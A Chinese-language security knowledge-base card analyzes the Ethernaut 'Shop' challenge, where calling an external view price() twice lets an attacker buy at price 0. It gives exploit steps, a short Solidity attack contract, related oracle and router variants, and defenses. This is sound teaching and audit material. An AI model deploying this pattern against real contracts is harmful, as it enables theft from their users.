---
id: blockchain-solidity-shop-view-price-double-call-toctou
title: Shop 合约 view 价格两次调用 TOCTOU：攻击者按 isSold 切换返回值以 0 价格买入
type: scenario
domain: blockchain
path: blockchain/solidity
technique: view-function-double-call-price-toctou
tags:
- blockchain
- solidity
- evm
- ethernaut
- toctou
- view-function
- external-call
- price-manipulation
cve: []
severity: medium
confidence: high
status: draft
created: '2026-11-07'
updated: '2026-11-07'
url: /docs/blockchain/solidity/blockchain-solidity-shop-view-price-double-call-toctou/
draft: false
kb_aliases:
- Ethernaut Shop
- view 函数两次调用
- 价格判断 TOCTOU
- 恶意 Buyer 合约
- price() 返回值不一致
---

## 一句话结论

`Shop.buy()` 在同一次购买流程里两次调用外部 `Buyer.price()`：第一次用于 `>= price` 门槛判断，第二次用于写入成交价，且两次调用之间把 `isSold` 置为 true；攻击者合约在第一次调用返回 100、第二次依据 `shop.isSold()` 返回 0，从而以 0 价格买入。

## 原理

- Solidity 的 `view` 只承诺“不修改状态”，编译器用 `STATICCALL` 调用它，EVM 层禁止被调函数写状态；但 `view` 并不保证多次调用返回相同值。被调合约仍可读取外部状态并据此分支，同一函数在两次调用中返回不同结果。
- Shop 的判断逻辑是：

```
if (_buyer.price() >= price && !isSold) {   // 第 1 次调用，此时 isSold=false
    isSold = true;                          // 状态改变
    price = _buyer.price();                 // 第 2 次调用，此时 isSold=true
}
```

  第一次调用时 `isSold=false`，攻击者合约返回 100 通过门槛；第二次调用时 `isSold=true`，攻击者合约返回 0，成交价被写成 0。
- 根因不是重入（view 不能写状态），而是**对不可信外部合约的同一“报价”调用两次并信任其一致性**，属于合约层的 TOCTOU/报价不一致问题。真实合约若把该返回值当作付款金额或抵押率依据，攻击者可据此少付甚至不付。

## 触发条件

- 目标合约在一次交易内多次调用同一个外部合约的 view/pure 报价函数，并把两次结果分别用于校验与结算（或仅在判断后延迟使用）。
- 调用方能自行部署/指定被调合约（`Buyer(msg.sender)`、任意用户传入的 oracle/router 地址）。
- 两次调用之间存在可被被调合约观察到的状态变化（本例为 `isSold`），或调用顺序/参数可预测。
- 合约没有把首次报价缓存到局部变量，也没有对成交价做二次校验（`msg.value`、`minAmountOut`）。

## 利用步骤

1. 部署攻击合约 `Buyer`，构造时保存 Shop 地址。
2. `price()` 实现为：读取 `shop.isSold()`，为 false 时返回 `100`（不小于 Shop 的初始 `price`），为 true 时返回 `0`。
3. 攻击合约调用 `shop.buy()`：Shop 以 `msg.sender` 为 Buyer 发起第 1 次 `price()` 调用，拿到 100 进入分支；Shop 置 `isSold=true` 后发起第 2 次调用，拿到 0；`price` 被更新为 0。
4. 若真实业务在 `buy` 后按 `price` 扣款或结算，攻击者此时以 0 成本完成购买；Ethernaut 关卡中表现为 `isSold=true` 且 `price=0`。

## PoC

```solidity
// 最小攻击合约（Solidity ^0.8.0）
interface IShop { function buy() external; function isSold() external view returns (bool); }

contract Buyer {
    IShop public shop;
    constructor(address s) { shop = IShop(s); }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : 100;   // 第 1 次返回 100 过门槛，第 2 次返回 0 定价
    }
    function attack() external { shop.buy(); }
}
```

原文附带 Ethernaut 通关截图，`Buyer.attack()` 调用后关卡判定通过。

## 变体与关联

- 同类模式：合约先调用 `router.getAmountsOut()`/`oracle.latestAnswer()` 校验用户报价，再用第二次调用结果结算；攻击者用可切换返回值的恶意 oracle/router 或利用两次调用间的状态变化。
- 与重入的区别：view 函数受 STATICCALL 限制无法写状态，因此利用点不在“写状态”而在“返回值不一致”；但若报价函数不是 view，则可能同时叠加重入。
- 与价格操纵卡的区别：本卡操纵的是“调用返回值的时序一致性”，不是 AMM 储备比例。

## 检测与防御

- 一次调用只取一次值：把 `_buyer.price()` 的结果缓存到局部变量，后续判断与定价都使用该缓存；禁止在同一交易内重复调用不可信合约的报价。
- 使用可信预言机/TWAP，并对结算价设置上限、滑点与 `minAmountOut`；校验 `msg.value` 与实际应付金额。
- 若必须二次调用，比较两次结果是否一致，不一致直接 revert；或要求报价带签名/有效期，防止调用方自建合约。
- 审计关注点：`if (x.f() ...)` 与函数体内再次 `x.f()`；`STATICCALL` 不等于确定性。
